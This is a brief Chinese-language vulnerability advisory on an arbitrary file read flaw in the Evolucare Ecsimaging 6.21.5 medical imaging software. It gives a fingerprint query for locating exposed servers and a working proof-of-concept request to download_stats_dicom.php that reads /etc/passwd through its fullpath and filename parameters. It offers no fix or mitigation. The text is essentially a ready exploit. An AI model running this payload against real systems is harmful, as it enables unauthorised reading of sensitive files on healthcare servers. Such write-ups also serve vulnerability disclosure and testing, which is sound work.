# Evolucare Ecsimaging download_stats_dicom.php 任意文件读取漏洞

## 漏洞描述

Evolucare Ecsimaging download_stats_dicom.php 存在文件读取漏洞,攻击者可利用该漏洞获取系统敏感信息等.

## 漏洞影响

```
EVOLUCARE Evolucare Ecsimaging 6.21.5
```

## 网络测绘

```
body="ECSimaging"
```

## 漏洞复现

登录页面

![](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326114026991.png)

验证POC

```
/download_stats_dicom.php?fullpath=/etc/passwd&filename=/etc/passwd
```

![](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326114026992.png)